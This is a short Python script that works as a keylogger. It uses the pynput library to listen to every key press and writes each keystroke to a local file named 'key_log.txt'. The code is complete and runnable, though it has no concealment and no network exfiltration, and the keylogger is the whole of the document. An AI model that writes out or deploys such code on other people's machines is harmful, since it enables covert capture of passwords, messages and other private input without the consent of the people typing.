# -*- coding: utf-8 -*-

from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG)


def on_press(key):
    logging.info('"{0}"'.format(key))


with Listener(on_press=on_press) as listener:
    listener.join()
